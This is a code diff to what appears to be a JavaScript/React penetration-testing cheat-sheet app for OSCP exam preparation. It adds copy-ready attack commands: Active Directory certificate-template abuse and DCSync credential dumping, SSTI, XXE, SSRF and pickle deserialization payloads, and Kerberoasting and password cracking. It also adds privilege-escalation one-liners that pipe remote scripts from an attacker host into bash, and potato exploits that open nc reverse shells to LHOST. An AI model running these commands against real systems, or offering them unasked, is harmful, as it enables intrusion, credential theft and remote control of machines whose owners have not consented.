@@ -52,7 +52,17 @@ const AD_CHAIN = [
     ]
   },
   {
-    phase: "5. Domain Compromise",
+    phase: "5. ADCS (Certificate Services)",
+    desc: "If AD CS is present, abuse misconfigured certificate templates for DA.",
+    steps: [
+      { action: "Find ADCS + vulnerable templates", cmd: (u,p,d,dc) => `# Certipy — find all vulnerable templates:\ncertipy find -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -vulnerable -stdout\n\n# Or from Windows:\n.\\Certify.exe find /vulnerable`, check: "ESC1-ESC8 vulnerable templates?", critical: true },
+      { action: "ESC1 — Template abuse", cmd: (u,p,d,dc) => `# Request cert with SAN of DA:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'\n\n# Auth with the cert:\ncertipy auth -pfx administrator.pfx -dc-ip ${dc||"DC_IP"}`, check: "Get DA cert → auth as DA!", critical: true },
+      { action: "ESC4 — Template ACL abuse", cmd: (u,p,d,dc) => `# If you have write access to a template:\ncertipy template -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -template 'VULN-TEMPLATE' -save-old\n\n# Then request like ESC1:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'`, check: "Modify template → ESC1 attack" },
+      { action: "Shadow Credentials", cmd: (u,p,d,dc) => `# If you have GenericWrite on a computer/user:\ncertipy shadow auto -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -account 'TARGET$' -dc-ip ${dc||"DC_IP"}\n\n# Or with pywhisker:\npython3 pywhisker.py -d '${d||"domain.local"}' -u '${u||"user"}' -p '${p||"password"}' --target 'TARGET$' --action add --dc-ip ${dc||"DC_IP"}`, check: "GenericWrite → Shadow Credentials → auth" },
+    ]
+  },
+  {
+    phase: "6. Domain Compromise",
     desc: "Final step: Domain Admin or equivalent access to the DC.",
     steps: [
       { action: "DCSync attack", cmd: (u,p,d,dc) => `# If you have replication rights (or are DA):\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||"DC_IP"} -just-dc\n\n# Dump only specific user:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||"DC_IP"} -just-dc-user Administrator`, check: "Full domain hash dump = game over", critical: true },
@@ -97,6 +107,11 @@ const PORT_PLAYBOOKS = {
     { action: "LFI / RFI", cmd: (t) => `# LFI:\ncurl "http://${t}/page?file=../../../etc/passwd"\ncurl "http://${t}/page?file=....//....//....//etc/passwd"\ncurl "http://${t}/page?file=/etc/passwd%00"\n\n# Windows LFI:\ncurl "http://${t}/page?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"\n\n# PHP wrappers:\ncurl "http://${t}/page?file=php://filter/convert.base64-encode/resource=index.php"`, check: "Path traversal? PHP wrappers?" },
     { action: "File upload bypass", cmd: () => `# Bypass techniques:\n# 1. Change extension: .php5, .phtml, .phar, .phps, .pHP\n# 2. Double ext: shell.php.jpg\n# 3. Null byte: shell.php%00.jpg\n# 4. Content-Type: image/jpeg with PHP content\n# 5. Magic bytes: GIF89a<?php system($_GET['cmd']); ?>\n# 6. .htaccess: AddType application/x-httpd-php .jpg`, check: "Bypass filters for RCE" },
     { action: "Command injection", cmd: (t) => `# Test characters: ; | \` $() & && ||\ncurl "http://${t}/page?ip=127.0.0.1;id"\ncurl "http://${t}/page?ip=127.0.0.1|id"\ncurl "http://${t}/page?ip=\$(id)"`, check: "OS command execution?" },
+    { action: "SSTI (Template Injection)", cmd: (t) => `# Test payloads in ALL input fields:\n{{7*7}}  →  49 = Jinja2/Twig\n\${7*7}  →  49 = Freemarker/Velocity\n#{7*7}  →  49 = Thymeleaf\n<%= 7*7 %>  →  49 = ERB (Ruby)\n\n# Jinja2 RCE:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Twig RCE:\n{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`, check: "Template engine? → RCE!", critical: true },
+    { action: "XXE (XML External Entity)", cmd: (t) => `# If app accepts XML input:\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>\n\n# Blind XXE (out-of-band):\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://LHOST:80/xxe">\n]>\n<root>&xxe;</root>\n\n# PHP base64 wrapper:\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">\n]>`, check: "XML input? File read or SSRF via XXE" },
+    { action: "SSRF (Server-Side Request Forgery)", cmd: (t) => `# Test internal access:\ncurl "http://${t}/fetch?url=http://127.0.0.1:80"\ncurl "http://${t}/fetch?url=http://127.0.0.1:8080"\ncurl "http://${t}/fetch?url=http://127.0.0.1:3306"\n\n# Cloud metadata (if cloud):\ncurl "http://${t}/fetch?url=http://169.254.169.254/latest/meta-data/"\n\n# Port scan internal:\nfor p in 21 22 80 443 3306 5432 8080; do curl -s "http://${t}/fetch?url=http://127.0.0.1:$p" & done`, check: "Internal services? Metadata?" },
+    { action: "Deserialization", cmd: (t) => `# Java (ysoserial):\njava -jar ysoserial.jar CommonsCollections1 'ping LHOST' | base64\n\n# PHP:\n# Look for serialize()/unserialize() in source\n# Craft __wakeup()/__destruct() chains\n\n# Python (pickle):\nimport pickle, os\nclass Exploit:\n  def __reduce__(self):\n    return (os.system, ('id',))\npickle.dumps(Exploit())`, check: "Serialized objects in cookies/params?" },
+    { action: "JWT abuse", cmd: (t) => `# Decode JWT:\necho 'JWT_TOKEN' | cut -d'.' -f2 | base64 -d 2>/dev/null\n\n# None algorithm attack:\n# Change header to {"alg":"none"} and remove signature\n\n# Crack JWT secret:\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\njohn jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256\n\n# jwt_tool:\npython3 jwt_tool.py JWT_TOKEN -T -S hs256 -p 'secret'`, check: "Weak secret? None alg? Key confusion?" },
   ]},
   443: { service: "HTTPS", icon: "🔒", priority: "CRITICAL", steps: [
     { action: "SSL cert recon", cmd: (t) => `openssl s_client -connect ${t}:443 2>/dev/null | openssl x509 -noout -text | grep -E '(Subject|DNS|Issuer)'`, check: "Hostnames? Internal names?", critical: true },
@@ -159,11 +174,56 @@ const PORT_PLAYBOOKS = {
   8443: { service: "HTTPS-Alt", icon: "🔒", priority: "HIGH", steps: [
     { action: "Enum", cmd: (t) => `whatweb https://${t}:8443 -v\nferoxbuster -u https://${t}:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k`, check: "API? Admin?" },
   ]},
+  88: { service: "Kerberos", icon: "🎫", priority: "MEDIUM", steps: [
+    { action: "Enumerate users (no creds)", cmd: (t) => `kerbrute userenum -d DOMAIN --dc ${t} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`, check: "Valid domain users?", critical: true },
+    { action: "AS-REP roast (no creds)", cmd: (t) => `impacket-GetNPUsers DOMAIN/ -dc-ip ${t} -usersfile users.txt -no-pass -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`, check: "Accounts without pre-auth?" },
+    { action: "Kerberoast (with creds)", cmd: (t) => `impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip ${t} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`, check: "Service account hashes?" },
+  ]},
+  143: { service: "IMAP", icon: "📨", priority: "MEDIUM", steps: [
+    { action: "Banner & login", cmd: (t) => `nc -nv ${t} 143\n# a LOGIN user password\n# a LIST "" "*"\n# a SELECT INBOX\n# a FETCH 1:* (BODY[HEADER.FIELDS (SUBJECT FROM)])`, check: "Emails with creds?", critical: true },
+    { action: "Brute-force", cmd: (t) => `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://${t} -t 4`, check: "Valid creds?" },
+  ]},
+  161: { service: "SNMP", icon: "📡", priority: "HIGH", steps: [
+    { action: "Community string brute", cmd: (t) => `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt ${t}`, check: "Valid community string?", critical: true },
+    { action: "Full SNMP walk", cmd: (t) => `snmpwalk -v2c -c public ${t} . | tee snmpwalk.txt\nsnmpbulkwalk -v2c -c public ${t} . | tee snmpbulk.txt`, check: "Users? Software? Processes? Interfaces?", critical: true },
+    { action: "Extract users", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.4.1.77.1.2.25`, check: "Windows user enumeration via SNMP" },
+    { action: "Extract running processes", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.2.1.25.4.2.1.2`, check: "Running services? Creds in command line?" },
+    { action: "Extract installed software", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.2.1.25.6.3.1.2`, check: "Vulnerable software versions?" },
+    { action: "Extract TCP connections", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.2.1.6.13.1.3`, check: "Internal services?" },
+  ]},
+  389: { service: "LDAP", icon: "📒", priority: "HIGH", steps: [
+    { action: "Anonymous bind", cmd: (t) => `ldapsearch -x -H ldap://${t} -b "" -s base namingContexts\nldapsearch -x -H ldap://${t} -b "DC=domain,DC=local" "(objectClass=*)" 2>/dev/null | head -50`, check: "Anonymous access?", critical: true },
+    { action: "Enum users (anon)", cmd: (t) => `ldapsearch -x -H ldap://${t} -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf | grep -E '(sAMAccountName|description|memberOf):'`, check: "Users? Descriptions with passwords?" },
+    { action: "Enum with creds", cmd: (t) => `ldapsearch -x -H ldap://${t} -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName memberOf description\n\n# Or use windapsearch:\npython3 windapsearch.py -d domain.local --dc-ip ${t} -u user -p password --users --groups --computers`, check: "Full domain enum via LDAP" },
+    { action: "Nmap scripts", cmd: (t) => `nmap --script ldap-rootdse,ldap-search,ldap-brute -p389 ${t}`, check: "Domain info? Base DN?" },
+  ]},
+  2049: { service: "NFS", icon: "📂", priority: "HIGH", steps: [
+    { action: "List exports", cmd: (t) => `showmount -e ${t}\nnmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 ${t}`, check: "Mountable shares?", critical: true },
+    { action: "Mount & enumerate", cmd: (t) => `mkdir /tmp/nfs && mount -t nfs ${t}:/share /tmp/nfs -o nolock\nls -la /tmp/nfs/\nfind /tmp/nfs/ -type f -name '*.txt' -o -name '*.conf' -o -name '*.bak' -o -name 'id_rsa' -o -name '*.kdbx' 2>/dev/null`, check: "SSH keys? Configs? Creds?" },
+    { action: "UID spoof", cmd: () => `# If permission denied — create user with matching UID:\nuseradd -u TARGET_UID tempuser\nsu tempuser\n# Now access files as that user\n\n# Or use nfspysh:\nnfspysh -o server=${"{"}TARGET{"}"}:/share`, check: "Bypass no_root_squash?" },
+  ]},
+  27017: { service: "MongoDB", icon: "🍃", priority: "MEDIUM", steps: [
+    { action: "No-auth access", cmd: (t) => `mongosh --host ${t} --port 27017\n# Or: mongo ${t}:27017\n\n# In shell:\nshow dbs\nuse admin\ndb.getUsers()\nshow collections`, check: "Unauthenticated access?", critical: true },
+    { action: "Dump databases", cmd: (t) => `mongodump --host ${t} --port 27017 --out /tmp/mongodump/\n\n# Or enumerate manually:\n# db.COLLECTION.find().pretty()`, check: "Creds? Sensitive data?" },
+  ]},
 };
 
 // ─── PRIV ESC DECISION TREES ───
 const PRIVESC = {
   linux: [
+    { id: "enum", label: "Run LinPEAS + pspy", cmd: (ip) => `# Download and run (from attacker http server):
+curl http://${ip||"LHOST"}/linpeas.sh | bash | tee linpeas.txt
+
+# Or transfer first:
+wget http://${ip||"LHOST"}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.txt
+
+# pspy (hidden cron/processes):
+wget http://${ip||"LHOST"}/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000
+
+# linux-smart-enumeration:
+curl http://${ip||"LHOST"}/lse.sh | bash`, q: "Run automated enumeration FIRST", critical: true,
+      yes: "Read output carefully — look for highlighted (RED/YELLOW) items",
+      no: "If can't transfer files, proceed to manual checks below" },
     { id: "sudo", label: "sudo -l", cmd: () => `sudo -l`, q: "Sudo entries found?", critical: true,
       yes: `Check EACH binary at https://gtfobins.github.io/\nCommon instant wins:`,
       yesCmd: () => `sudo vim -c ':!/bin/bash'\nsudo find / -exec /bin/sh \\;\nsudo python3 -c 'import os;os.system("/bin/bash")'\nsudo env /bin/bash\nsudo awk 'BEGIN {system("/bin/bash")}'\nsudo less /etc/shadow  # then !bash\nsudo nmap --interactive  # then !sh\nsudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash`,
@@ -195,6 +255,20 @@ const PRIVESC = {
       no: "Re-enumerate. Run linpeas again. Check EVERYTHING." },
   ],
   windows: [
+    { id: "enum", label: "Run WinPEAS + Seatbelt", cmd: (ip) => `# Download and run:
+certutil -urlcache -split -f http://${ip||"LHOST"}/winPEASx64.exe C:\\Temp\\winpeas.exe
+C:\\Temp\\winpeas.exe | tee C:\\Temp\\winpeas.txt
+
+# PowerUp:
+powershell -ep bypass -c ". C:\\Temp\\PowerUp.ps1; Invoke-AllChecks"
+
+# Seatbelt:
+C:\\Temp\\Seatbelt.exe -group=all
+
+# SharpUp:
+C:\\Temp\\SharpUp.exe audit`, q: "Run automated enumeration FIRST", critical: true,
+      yes: "Read output carefully — check each finding",
+      no: "If can't transfer, proceed to manual checks below" },
     { id: "whoami", label: "Check Privileges", cmd: () => `whoami /all\nwhoami /priv\nnet user %username%`, q: "SeImpersonate or SeAssignPrimaryToken?", critical: true,
       yes: "POTATO ATTACK! This is your fastest path to SYSTEM.",
       yesCmd: () => `# GodPotato (works on all modern Windows):\n.\\GodPotato.exe -cmd "cmd /c C:\\Temp\\nc.exe LHOST LPORT -e cmd.exe"\n\n# PrintSpoofer:\n.\\PrintSpoofer.exe -c "cmd /c C:\\Temp\\nc.exe LHOST LPORT -e cmd.exe"\n\n# JuicyPotatoNG:\n.\\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c C:\\Temp\\nc.exe LHOST LPORT -e cmd.exe"\n\n# SweetPotato:\n.\\SweetPotato.exe -p C:\\Temp\\nc.exe -a "LHOST LPORT -e cmd.exe"`,
@@ -466,7 +540,7 @@ function ADTab({lhost}){
 
   return(<div>
     <div className="score-bar">
-      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>AD Set = 40 pts (assumed breach)</div>
+      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>AD Set = 10 + 10 + 20 = 40 pts (assumed breach)</div>
       <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Need 70 to pass</div>
     </div>
     <div className="ad-inputs">
@@ -608,6 +682,39 @@ function ShellTab({lhost,lport}){
     <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# 1. Spawn PTY\npython3 -c 'import pty;pty.spawn("/bin/bash")'\n\n# 2. Background: Ctrl+Z\n\n# 3. Fix terminal\nstty raw -echo; fg\n\n# 4. Set env\nexport TERM=xterm\nexport SHELL=bash\nstty rows 50 cols 200`}</div></div>
     <div className="sec-title">File Transfers</div>
     <div className="gen-out"><div className="cmd">{`# ─── ATTACKER ───\npython3 -m http.server 80\nimpacket-smbserver share . -smb2support\n\n# ─── LINUX TARGET ───\nwget http://${h}/file -O /tmp/file\ncurl http://${h}/file -o /tmp/file\n\n# ─── WINDOWS TARGET ───\ncertutil -urlcache -split -f http://${h}/file.exe C:\\Temp\\file.exe\npowershell -c "(New-Object Net.WebClient).DownloadFile('http://${h}/file.exe','C:\\Temp\\file.exe')"\ncopy \\\\${h}\\share\\file.exe C:\\Temp\\file.exe\n\n# ─── Impacket SMB (Windows to Attacker) ───\ncopy C:\\Temp\\loot.txt \\\\${h}\\share\\loot.txt`}</div></div>
+    <div className="sec-title">Password Mutation & Cracking</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ─── COMMON OSCP PASSWORD PATTERNS ───
+# Season+Year:    Spring2025!, Summer2026!, Winter2025!
+# Month+Year:     January2025!, March2026!
+# Company+Num:    CompanyName1!, Corp2025!
+# User+Num:       username1, admin123, user2025!
+# Keyboard walks: qwerty, asdf1234!, P@ssw0rd
+# Default:        password, Password1, Welcome1!, letmein
+
+# ─── HASHCAT RULES ───
+hashcat -m MODE hash.txt wordlist.txt --rules-file /usr/share/hashcat/rules/best64.rule
+hashcat -m MODE hash.txt wordlist.txt --rules-file /usr/share/hashcat/rules/rockyou-30000.rule
+hashcat -m MODE hash.txt wordlist.txt --rules-file /usr/share/hashcat/rules/InsidePro-PasswordProRules.rule
+
+# ─── GENERATE CUSTOM WORDLIST ───
+# cewl (from website):
+cewl http://TARGET -d 3 -m 5 -w cewl.txt
+
+# Add mutations with hashcat:
+hashcat --stdout cewl.txt --rules-file /usr/share/hashcat/rules/best64.rule > mutated.txt
+
+# Or manually create patterns:
+for word in $(cat cewl.txt); do
+  echo "$word" >> custom.txt
+  echo "$word!" >> custom.txt
+  echo "$word\${2025}" >> custom.txt
+  echo "$word\${2026}" >> custom.txt
+  echo "\${word^}1" >> custom.txt
+  echo "\${word^}123" >> custom.txt
+done
+
+# ─── JOHN RULES ───
+john --wordlist=wordlist.txt --rules=best64 hash.txt`}</div></div>
   </div>)
 }
 
@@ -801,20 +908,203 @@ proof.txt:
   </div>)
 }
 
+// ━━━ TAB: INITIAL RECON ━━━
+function ReconTab({targetIP}){
+  const t=targetIP||"TARGET";
+  const scans=[
+    { label: "Quick TCP (top 1000)", cmd: `nmap -sC -sV -oA nmap/initial ${t}`, desc: "Default scripts + version detection", critical: true },
+    { label: "Full TCP (all ports)", cmd: `nmap -p- --min-rate 5000 -oA nmap/full ${t}`, desc: "Find ALL open TCP ports", critical: true },
+    { label: "Targeted deep scan", cmd: `nmap -sC -sV -p PORTS -oA nmap/targeted ${t}`, desc: "Deep scan on found ports" },
+    { label: "UDP top 20", cmd: `sudo nmap -sU --top-ports 20 --min-rate 5000 -oA nmap/udp ${t}`, desc: "SNMP (161), TFTP (69), NTP (123)...", critical: true },
+    { label: "Vuln scan", cmd: `nmap --script vuln -p PORTS -oA nmap/vuln ${t}`, desc: "NSE vulnerability scripts" },
+    { label: "OS detection", cmd: `sudo nmap -O -p PORTS ${t}`, desc: "Determine OS type" },
+    { label: "AutoRecon (full auto)", cmd: `autorecon ${t} -o autorecon_results/`, desc: "Automated multi-tool scanning" },
+  ];
+  return(<div>
+    <div className="sec-title">Initial Scan Workflow</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# STEP 1: Create directory structure
+mkdir -p ${t}/{nmap,web,enum,exploit,loot}
+
+# STEP 2: Run these FIRST (in parallel):
+nmap -sC -sV -oA ${t}/nmap/initial ${t} &
+nmap -p- --min-rate 5000 -oA ${t}/nmap/full ${t} &
+sudo nmap -sU --top-ports 20 -oA ${t}/nmap/udp ${t} &
+
+# STEP 3: When full scan finishes, deep scan found ports:
+# nmap -sC -sV -p <FOUND_PORTS> -oA ${t}/nmap/targeted ${t}
+
+# STEP 4: Start service-specific enumeration based on results`}</div></div>
+    <div className="sec-title">Scan Templates</div>
+    {scans.map((s,i)=><div className="gen-card" key={i} style={{marginBottom:6,cursor:'default'}}>
+      <div style={{flex:1}}>
+        <div style={{fontSize:12,fontWeight:700,color:s.critical?'var(--ac)':'var(--t0)'}}>{s.label}</div>
+        <div style={{fontSize:10,color:'var(--t2)',marginTop:2}}>{s.desc}</div>
+        <div className="cmd" style={{marginTop:4,fontSize:10}}>{s.cmd}</div>
+      </div>
+      <CopyBtn text={s.cmd}/>
+    </div>)}
+    <div className="sec-title" style={{marginTop:20}}>Nmap Cheatsheet</div>
+    <div className="gen-out"><div className="cmd">{`# Scan types:
+-sS  = SYN stealth scan (default, needs root)
+-sT  = TCP connect scan (no root needed)
+-sU  = UDP scan
+-sV  = Version detection
+-sC  = Default scripts
+-O   = OS detection
+-A   = Aggressive (sV + sC + O + traceroute)
+
+# Speed:
+--min-rate 5000    = Fast scan
+-T4                = Aggressive timing
+-p-                = All 65535 ports
+--top-ports 20     = Top 20 common ports
+
+# Output:
+-oA name           = All formats (.nmap, .gnmap, .xml)
+-oN name.txt       = Normal output
+-oG name.gnmap     = Grepable output
+
+# Scripts:
+--script vuln              = Vulnerability scripts
+--script "smb-*"           = All SMB scripts
+--script-args              = Pass args to scripts`}</div></div>
+  </div>)
+}
+
+// ━━━ TAB: TUNNELING & PIVOTING ━━━
+function TunnelingTab({lhost}){
+  const h=lhost||"LHOST";
+  const sections=[
+    { title: "SSH Tunneling", items: [
+      { label: "Local Port Forward", desc: "Access remote:8080 via localhost:8080", cmd: `ssh -L 8080:127.0.0.1:8080 user@TARGET\n# Now access: http://127.0.0.1:8080`, critical: true },
+      { label: "Remote Port Forward", desc: "Expose attacker port through target", cmd: `ssh -R 8080:127.0.0.1:80 user@TARGET\n# Target's :8080 now reaches your :80` },
+      { label: "Dynamic SOCKS proxy", desc: "Full SOCKS proxy through SSH", cmd: `ssh -D 1080 user@TARGET\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT -p80,443,445 INTERNAL_NET`, critical: true },
+      { label: "SSH through pivot", desc: "Multi-hop SSH", cmd: `ssh -J user@PIVOT user@INTERNAL_TARGET\n# Or manually:\nssh -L 2222:INTERNAL:22 user@PIVOT\nssh -p 2222 user@127.0.0.1` },
+    ]},
+    { title: "Chisel", items: [
+      { label: "Reverse SOCKS proxy", desc: "SOCKS proxy via chisel", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target:\n./chisel client ${h}:8000 R:socks\n\n# Configure proxychains:\n# socks5 127.0.0.1 1080\nproxychains nmap -sT INTERNAL_NET`, critical: true },
+      { label: "Port forward", desc: "Forward specific port", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target (forward target's internal :8080 to attacker's :8080):\n./chisel client ${h}:8000 R:8080:127.0.0.1:8080` },
+    ]},
+    { title: "Ligolo-ng", items: [
+      { label: "Full setup", desc: "VPN-like tunneling — best for AD pivoting", cmd: `# On attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On target:\n./agent -connect ${h}:11601 -ignore-cert\n\n# In ligolo console:\n>> session\n>> ifconfig\n>> start\n\n# Add route to internal network:\nsudo ip route add 10.10.10.0/24 dev ligolo`, critical: true },
+    ]},
+    { title: "sshuttle", items: [
+      { label: "VPN over SSH", desc: "Route all traffic through SSH pivot", cmd: `sshuttle -r user@TARGET 10.10.10.0/24\n# Or specific subnets:\nsshuttle -r user@TARGET 10.10.10.0/24 172.16.0.0/16`, critical: true },
+    ]},
+    { title: "socat & Port Forwarding", items: [
+      { label: "Simple port forward", desc: "Forward local port to remote", cmd: `socat TCP-LISTEN:8080,fork TCP:INTERNAL_TARGET:80\n# Now access internal:80 via pivot:8080` },
+      { label: "Upload socat (static)", desc: "Transfer socat to target", cmd: `# Attacker:\npython3 -m http.server 80\n\n# Target (Linux):\ncurl http://${h}/socat -o /tmp/socat && chmod +x /tmp/socat\n\n# Target (Windows):\ncertutil -urlcache -split -f http://${h}/socat.exe C:\\Temp\\socat.exe` },
+    ]},
+  ];
+
+  return(<div>
+    <div className="score-bar">
+      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>Essential for AD sets — pivot between domain machines</div>
+    </div>
+    {sections.map((sec,si)=><div key={si}>
+      <div className="sec-title">{sec.title}</div>
+      {sec.items.map((item,ii)=><div className="gen-card" key={ii} style={{marginBottom:6,cursor:'default',flexDirection:'column',alignItems:'stretch'}}>
+        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center'}}>
+          <div>
+            <div style={{fontSize:12,fontWeight:700,color:item.critical?'var(--ac)':'var(--t0)'}}>{item.label}</div>
+            <div style={{fontSize:10,color:'var(--t2)',marginTop:1}}>{item.desc}</div>
+          </div>
+          <CopyBtn text={item.cmd}/>
+        </div>
+        <div className="cmd" style={{marginTop:6,fontSize:10}}>{item.cmd}</div>
+      </div>)}
+    </div>)}
+    <div className="sec-title" style={{marginTop:20}}>Transfer Tunneling Tools</div>
+    <div className="gen-out"><div className="cmd">{`# Download links (get latest releases):
+# Chisel:    https://github.com/jpillora/chisel/releases
+# Ligolo-ng: https://github.com/nicocha30/ligolo-ng/releases
+# socat:     https://github.com/andrew-d/static-binaries
+
+# Host on attacker:
+python3 -m http.server 80
+
+# Grab from target (Linux):
+wget http://${h}/chisel && chmod +x chisel
+curl http://${h}/ligolo-agent -o agent && chmod +x agent
+
+# Grab from target (Windows):
+certutil -urlcache -split -f http://${h}/chisel.exe C:\\Temp\\chisel.exe
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://${h}/chisel.exe','C:\\Temp\\chisel.exe')"`}</div></div>
+  </div>)
+}
+
+// ━━━ TAB: I'M STUCK ━━━
+function StuckTab(){
+  const checks=[
+    { q: "Did you scan ALL 65535 TCP ports?", cmd: "nmap -p- --min-rate 5000 TARGET", tip: "Many OSCP boxes hide services on high ports (8000-65535). A top-1000 scan WILL miss them.", critical: true },
+    { q: "Did you scan UDP?", cmd: "sudo nmap -sU --top-ports 20 TARGET", tip: "SNMP (161) is the #1 missed port. It can leak usernames, running processes, and installed software.", critical: true },
+    { q: "Did you try ALL found creds on ALL services?", cmd: "crackmapexec smb TARGETS -u users.txt -p passwords.txt --continue-on-success", tip: "Password reuse is VERY common. Try every credential on SSH, SMB, WinRM, RDP, web apps, databases.", critical: true },
+    { q: "Did you Google the EXACT version?", cmd: "searchsploit 'ServiceName Version'\n# Also: Google 'ServiceName Version exploit'", tip: "Many boxes use services with known CVEs. Search: 'Apache 2.4.49 exploit', 'vsftpd 2.3.4 backdoor', etc." },
+    { q: "Did you read the source code?", cmd: "# View page source in browser\n# Look for: comments, hidden fields, JS files, API endpoints\ncurl -s http://TARGET/ | grep -iE '(comment|hidden|api|key|token|secret|password|TODO|FIXME|href|src)'", tip: "Comments in HTML/JS often leak paths, creds, or hints." },
+    { q: "Did you check for VHosts/subdomains?", cmd: "gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain\n# Also check /etc/hosts or DNS zone transfer", tip: "Different vhosts can have completely different applications." },
+    { q: "Did you try directory brute with different wordlists?", cmd: "feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx,bak,old,conf", tip: "Try multiple wordlists: raft-medium, directory-list-2.3-medium, common.txt. Try different extensions." },
+    { q: "Did you check ALL parameters for injection?", cmd: "# SQLi: ' OR 1=1-- -\n# SSTI: {{7*7}}\n# LFI: ../../etc/passwd\n# CMDi: ;id\n# XSS: <script>alert(1)</script>", tip: "Test EVERY input field, URL parameter, cookie, and header for injection vulnerabilities." },
+    { q: "Did you check for default credentials?", cmd: "# WordPress: admin/admin\n# Tomcat: tomcat/s3cret\n# Jenkins: no auth or admin/admin\n# phpMyAdmin: root/(empty)\n# CMS: admin/admin", tip: "ALWAYS try default creds. This is free and often works.", critical: true },
+    { q: "Did you run automated enumeration tools?", cmd: "# Linux: ./linpeas.sh | tee linpeas.txt\n# Windows: .\\winPEASx64.exe | tee winpeas.txt\n# Also: ./pspy64 -pf -i 1000", tip: "Run linpeas/winpeas TWICE — once normally, once reading the output carefully." },
+    { q: "Are there internal services (127.0.0.1 only)?", cmd: "# Linux: ss -tlnp\n# Windows: netstat -ano | findstr LISTENING", tip: "Services bound to localhost need port forwarding to reach. This is a common pattern." },
+    { q: "Did you check for password patterns?", cmd: "# Common OSCP patterns:\n# Season+Year: Winter2025!, Summer2026!\n# Company+Numbers: Corp123!, Admin2025!\n# User+Numbers: username1, username123\n# Keyboard walks: qwerty, !@#$%", tip: "Try password mutations with hashcat rules." },
+  ];
+
+  return(<div>
+    <div className="score-bar">
+      <div className="score-seg" style={{background:'var(--rd)',color:'var(--r)',flex:2}}>
+        ⚠️ RULE: Never spend more than 2 hours on one vector. Move on and come back later.
+      </div>
+    </div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question top-to-bottom. If you answer "no" to ANY of these, do it before trying anything else.</p>
+    {checks.map((c,i)=><div className="tree-step" key={i} style={{marginBottom:6}}>
+      <div style={{padding:'10px 14px'}}>
+        <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
+          <div className={`phase-num ${c.critical?'':'done'}`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
+          <div style={{flex:1}}>
+            <div style={{fontSize:13,fontWeight:700,color:'var(--t0)'}}>{c.q}</div>
+            <div style={{fontSize:11,color:'var(--t2)',marginTop:2}}>{c.tip}</div>
+          </div>
+          <CopyBtn text={c.cmd}/>
+        </div>
+        <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
+      </div>
+    </div>)}
